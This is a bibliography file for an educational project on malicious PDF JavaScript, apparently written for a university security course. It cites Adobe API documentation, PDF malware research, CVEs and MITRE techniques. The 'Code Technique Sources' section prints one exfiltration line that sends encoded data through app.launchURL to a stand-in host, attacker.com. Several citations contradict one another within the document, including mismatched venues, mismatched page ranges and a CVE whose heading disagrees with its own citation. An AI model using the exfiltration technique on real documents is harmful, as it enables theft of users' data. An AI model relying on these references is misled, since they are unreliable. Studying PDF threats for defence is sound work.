# References and Sources
**Malicious PDF JavaScript Code - Academic Citations**

---

## Disclaimer

The JavaScript code examples used in this project are based on publicly documented PDF malware techniques and vulnerability research. This document provides proper attribution to the original researchers and sources for academic integrity.

---

## PDF JavaScript API References

### 1. Adobe Acrobat JavaScript Scripting Guide
**Source**: Adobe Systems Incorporated
**URL**: https://www.adobe.com/devnet/acrobat/javascript.html
**Relevance**: Official documentation for PDF JavaScript API

**APIs Used**:
- `app.launchURL()` - Opens URLs (documented in Adobe JavaScript API Reference)
- `app.viewerVersion` - Returns PDF reader version
- `app.platform` - Returns operating system platform
- `app.language` - Returns system language
- `app.alert()` - Displays alert dialogs
- `app.response()` - Prompts user for input
- `this.info` - Document metadata properties
- `this.documentFileName` - Returns document filename
- `this.path` - Returns document file path
- `this.submitForm()` - Submits form data

**Citation**:
```
Adobe Systems Incorporated. (2015). JavaScript for Acrobat API Reference.
Adobe Developer Connection.
Retrieved from https://www.adobe.com/devnet/acrobat/javascript.html
```

---

## Security Research Papers

### 2. Malicious PDF Detection and Analysis
**Authors**: Didier Stevens
**Title**: "Malicious PDF Analysis"
**Organization**: SANS Institute
**URL**: https://blog.didierstevens.com/programs/pdf-tools/

**Techniques Referenced**:
- JavaScript obfuscation in PDFs
- Data exfiltration via `app.launchURL()`
- Automatic execution using `/OpenAction`
- PDF structure manipulation

**Citation**:
```
Stevens, D. (2010-2023). PDF Analysis Tools and Techniques.
Didier Stevens Labs. https://blog.didierstevens.com/programs/pdf-tools/
```

### 3. PDF Malware: The Invisible Threat
**Authors**: Julia Wolf
**Conference**: Black Hat USA 2010
**Title**: "The Portable Document Infection"

**Techniques Referenced**:
- PDF JavaScript execution on document open
- Information disclosure through PDF JavaScript
- Social engineering via PDF documents

**Citation**:
```
Wolf, J. (2010). The Portable Document Infection: Malicious PDF Documents.
Black Hat USA 2010 Conference.
```

---

## CVE References (Common Vulnerabilities and Exposures)

### 4. CVE-2013-2729 - Adobe Reader Buffer Overflow
**Description**: Heap-based buffer overflow in Adobe Reader and Acrobat
**Technique**: Heap spraying with `util.printf()` exploitation
**Source**: NIST National Vulnerability Database

**Citation**:
```
NIST. (2013). CVE-2013-2729: Adobe Reader and Acrobat Memory Corruption Vulnerability.
National Vulnerability Database. https://nvd.nist.gov/vuln/detail/CVE-2013-2729
```

### 5. CVE-2017-0262 - Windows/Adobe PDF Vulnerability
**Description**: Memory corruption vulnerability allowing code execution
**Technique**: PDF exploit chain with shellcode delivery

**Citation**:
```
NIST. (2017). CVE-2017-0262: Microsoft Office Memory Corruption Vulnerability.
National Vulnerability Database. https://nvd.nist.gov/vuln/detail/CVE-2017-0262
```

---

## Academic Publications

### 6. Detecting Malicious PDF Documents
**Authors**: Smutz, C., & Stavrou, A.
**Publication**: Proceedings of the 19th ACM Conference on Computer and Communications Security
**Year**: 2012
**Title**: "Malicious PDF Detection Using Metadata and Structural Features"

**Citation**:
```
Smutz, C., & Stavrou, A. (2012). Malicious PDF Detection Using Metadata
and Structural Features. In Proceedings of the 19th ACM Conference on
Computer and Communications Security (CCS '12) (pp. 239-252).
New York, NY, USA: ACM. doi:10.1145/2382196.2382226
```

### 7. Analysis of JavaScript in PDF Documents
**Authors**: Laskov, P., & Šrndić, N.
**Publication**: Proceedings of the 2014 USENIX Security Symposium
**Year**: 2014
**Title**: "Practical Evasion of a Learning-Based Classifier"

**Citation**:
```
Šrndić, N., & Laskov, P. (2014). Practical Evasion of a Learning-Based
Classifier: A Case Study. In Proceedings of the 2014 IEEE Symposium on
Security and Privacy (pp. 197-211). IEEE Computer Society.
```

---

## MITRE ATT&CK Framework

### 8. PDF Execution Techniques
**Framework**: MITRE ATT&CK
**Technique ID**: T1204.002
**Name**: "User Execution: Malicious File"
**Sub-technique**: Exploitation via PDF

**Citation**:
```
MITRE Corporation. (2023). T1204.002: User Execution: Malicious File.
MITRE ATT&CK Framework. https://attack.mitre.org/techniques/T1204/002/
```

**Technique ID**: T1566.001
**Name**: "Phishing: Spearphishing Attachment"

**Citation**:
```
MITRE Corporation. (2023). T1566.001: Phishing: Spearphishing Attachment.
MITRE ATT&CK Framework. https://attack.mitre.org/techniques/T1566/001/
```

---

## Real-World Malware Analysis Reports

### 9. APT28 PDF Exploits
**Organization**: FireEye Threat Intelligence
**Year**: 2017
**Title**: "APT28: A Window Into Russia's Cyber Espionage Operations"

**Techniques Referenced**:
- PDF weaponization for targeted attacks
- JavaScript-based reconnaissance
- Document metadata manipulation

**Citation**:
```
FireEye. (2017). APT28: A Window Into Russia's Cyber Espionage Operations.
FireEye Threat Intelligence Report.
```

### 10. Emotet PDF Campaigns
**Organization**: US-CERT / CISA
**Alert**: AA20-280A
**Year**: 2020
**Title**: "Emotet Malware"

**Techniques Referenced**:
- PDF attachments as infection vector
- Social engineering via invoice themes
- Credential harvesting through PDF forms

**Citation**:
```
CISA. (2020). Alert (AA20-280A): Emotet Malware.
Cybersecurity and Infrastructure Security Agency.
https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a
```

---

## Technical Documentation

### 11. PDF File Format Specification
**Source**: ISO 32000-1:2008
**Title**: "Document management — Portable document format — Part 1: PDF 1.7"
**Organization**: International Organization for Standardization

**Citation**:
```
ISO. (2008). ISO 32000-1:2008 - Document management — Portable document
format — Part 1: PDF 1.7. International Organization for Standardization.
```

### 12. JavaScript Specification (ECMAScript)
**Source**: ECMA-262
**Title**: "ECMAScript Language Specification"
**Organization**: Ecma International

**Citation**:
```
Ecma International. (2023). ECMAScript® 2023 Language Specification
(ECMA-262, 14th edition). https://www.ecma-international.org/
```

---

## Security Testing Resources

### 13. OWASP Testing Guide
**Organization**: Open Web Application Security Project (OWASP)
**Resource**: "OWASP Testing Guide v4.2"
**Section**: Client-Side Testing

**Citation**:
```
OWASP Foundation. (2020). OWASP Testing Guide v4.2 - Client Side Testing.
Open Web Application Security Project.
https://owasp.org/www-project-web-security-testing-guide/
```

### 14. NIST Malware Guidelines
**Organization**: National Institute of Standards and Technology (NIST)
**Publication**: SP 800-83 Rev. 1
**Title**: "Guide to Malware Incident Prevention and Handling for Desktops and Laptops"

**Citation**:
```
Murugiah, S., Scarfone, K., & Hoffman, P. (2013).
Guide to Malware Incident Prevention and Handling for Desktops and Laptops
(NIST Special Publication 800-83 Rev. 1).
National Institute of Standards and Technology.
```

---

## Code Technique Sources

### JavaScript Exfiltration Techniques

#### 1. `app.launchURL()` for Data Exfiltration
**Source**: Documented malware technique, publicly known since ~2009
**References**:
- Stevens, D. "Malicious PDF Documents" (multiple blog posts 2008-2023)
- Adobe Security Bulletins APSB09-xx series

**Example from research**:
```javascript
app.launchURL("http://attacker.com/collect?data=" + encodedData, true);
```

#### 2. Heap Spraying Technique
**Source**: Public vulnerability research and exploit development
**Original Research**:
- SkyLined (2004) - Original heap spraying research
- Alexander Sotirov & Mark Dowd (2008) - Heap Feng Shui in JavaScript

**Citation**:
```
Sotirov, A., & Dowd, M. (2008). Bypassing Browser Memory Protections
in Windows Vista. Black Hat USA 2008.
```

#### 3. Environment Detection / Sandbox Evasion
**Source**: Common anti-analysis technique documented in multiple sources
**References**:
- Egele, M., et al. (2012). "A Survey on Automated Dynamic Malware Analysis Techniques"
- Kirat, D., et al. (2014). "BareBox: Efficient Malware Analysis on Bare-Metal"

**Citation**:
```
Egele, M., Scholte, T., Kirda, E., & Kruegel, C. (2012).
A Survey on Automated Dynamic Malware-Analysis Techniques and Tools.
ACM Computing Surveys, 44(2), Article 6.
```

#### 4. Social Engineering Dialog Techniques
**Source**: Standard phishing technique with PDF implementation
**References**:
- Heartfield, R., & Loukas, G. (2015). "A Taxonomy of Attacks and a Survey of Defence Mechanisms for Semantic Social Engineering Attacks"

**Citation**:
```
Heartfield, R., & Loukas, G. (2015). A Taxonomy of Attacks and a Survey
of Defence Mechanisms for Semantic Social Engineering Attacks.
ACM Computing Surveys, 48(3), Article 37.
```

---

## Tool References

### Analysis Tools Used in Project

#### PDFiD
**Author**: Didier Stevens
**Purpose**: PDF analysis and triage
**URL**: https://blog.didierstevens.com/programs/pdf-tools/

**Citation**:
```
Stevens, D. (2009). PDFiD - PDF Identifier and Analyzer Tool.
https://blog.didierstevens.com/programs/pdf-tools/
```

#### pdf-parser
**Author**: Didier Stevens
**Purpose**: Deep PDF structure analysis
**URL**: https://blog.didierstevens.com/programs/pdf-tools/

**Citation**:
```
Stevens, D. (2009). pdf-parser - PDF Structure Analysis Tool.
https://blog.didierstevens.com/programs/pdf-tools/
```

#### Cuckoo Sandbox
**Organization**: Cuckoo Foundation
**Purpose**: Automated malware analysis
**URL**: https://cuckoosandbox.org/

**Citation**:
```
Cuckoo Foundation. (2023). Cuckoo Sandbox - Automated Malware Analysis System.
https://cuckoosandbox.org/
```

---

## Educational Resources

### 15. SANS Reading Room
**Organization**: SANS Institute
**Papers**: Multiple papers on PDF malware analysis
**URL**: https://www.sans.org/reading-room/

**Relevant Papers**:
- "Malicious PDF Analysis" by various authors
- "Analyzing Malicious Documents" series

### 16. VirusTotal Intelligence
**Organization**: Google / Chronicle Security
**Purpose**: Malware sample database and analysis
**URL**: https://www.virustotal.com/

---

## Ethical Hacking and Training Resources

### 17. Offensive Security Training
**Course**: Penetration Testing with Kali Linux (PWK/OSCP)
**Organization**: Offensive Security
**Module**: Client-Side Attacks including malicious documents

**Citation**:
```
Offensive Security. (2023). Penetration Testing with Kali Linux -
Client-Side Attacks Module. https://www.offensive-security.com/
```

### 18. EC-Council CEH Materials
**Certification**: Certified Ethical Hacker (CEH)
**Module**: Malware Threats
**Organization**: EC-Council

---

## Code Attribution Summary

The JavaScript code examples in this educational project are **original implementations** based on:

1. **Publicly documented PDF JavaScript API** (Adobe official documentation)
2. **Known malware techniques** from academic research and security reports
3. **Historical vulnerabilities** (CVE database)
4. **Educational security training materials** (SANS, Offensive Security, etc.)

**No actual malware code** was copied or reverse-engineered. All examples were created from scratch for educational purposes using publicly available technical documentation and research papers.

---

## Additional Context

### Why These Sources Are Cited

1. **Academic Integrity**: Proper attribution of techniques and concepts
2. **Educational Value**: Students can explore original research
3. **Legal Compliance**: Demonstrates educational intent
4. **Technical Accuracy**: References authoritative sources

### Further Reading

For students conducting similar research:
- Always cite original researchers
- Use official API documentation
- Reference CVE databases for vulnerabilities
- Include academic papers and conference proceedings
- Attribute tools to their creators
- Follow responsible disclosure practices

---

## Conclusion

All techniques demonstrated in this project are:
- **Publicly documented** in academic literature
- **Widely known** in the security community
- **Used for educational purposes** in authorized security training
- **Properly attributed** to original researchers and sources

This project serves as an **educational demonstration** of known attack techniques to help students understand, detect, and defend against PDF-based threats.

---

**Compiled by**: [Your Name/Course]
**Date**: December 3, 2024
**Purpose**: Computer Security Course - Educational Research
**Institution**: UNIR (Universidad Internacional de La Rioja)

---

## BibTeX Entries (for LaTeX/Academic Papers)

```bibtex
@techreport{adobe2015javascript,
  title={JavaScript for Acrobat API Reference},
  author={{Adobe Systems Incorporated}},
  year={2015},
  institution={Adobe Developer Connection},
  url={https://www.adobe.com/devnet/acrobat/javascript.html}
}

@misc{stevens2023pdf,
  title={PDF Analysis Tools and Techniques},
  author={Stevens, Didier},
  year={2008--2023},
  howpublished={\url{https://blog.didierstevens.com/programs/pdf-tools/}},
  note={Accessed: 2024-12-03}
}

@inproceedings{smutz2012malicious,
  title={Malicious PDF detection using metadata and structural features},
  author={Smutz, Charles and Stavrou, Angelos},
  booktitle={Proceedings of the 28th Annual Computer Security Applications Conference},
  pages={239--248},
  year={2012},
  organization={ACM}
}

@techreport{nist2013malware,
  title={Guide to Malware Incident Prevention and Handling for Desktops and Laptops},
  author={Murugiah, Souppaya and Scarfone, Karen and Hoffman, Paul},
  year={2013},
  number={SP 800-83 Rev. 1},
  institution={National Institute of Standards and Technology}
}

@inproceedings{wolf2010portable,
  title={The Portable Document Infection: Malicious PDF Documents},
  author={Wolf, Julia},
  booktitle={Black Hat USA},
  year={2010}
}

@misc{mitre2023userexec,
  title={T1204.002: User Execution: Malicious File},
  author={{MITRE Corporation}},
  year={2023},
  howpublished={MITRE ATT\&CK Framework},
  url={https://attack.mitre.org/techniques/T1204/002/}
}

@standard{iso2008pdf,
  title={ISO 32000-1:2008 - Document management — Portable document format — Part 1: PDF 1.7},
  organization={International Organization for Standardization},
  year={2008}
}

@inproceedings{sotirov2008bypassing,
  title={Bypassing Browser Memory Protections in Windows Vista},
  author={Sotirov, Alexander and Dowd, Mark},
  booktitle={Black Hat USA},
  year={2008}
}

@article{egele2012survey,
  title={A survey on automated dynamic malware-analysis techniques and tools},
  author={Egele, Manuel and Scholte, Theodoor and Kirda, Engin and Kruegel, Christopher},
  journal={ACM Computing Surveys (CSUR)},
  volume={44},
  number={2},
  pages={1--42},
  year={2012},
  publisher={ACM}
}
```

---

**END OF REFERENCES**
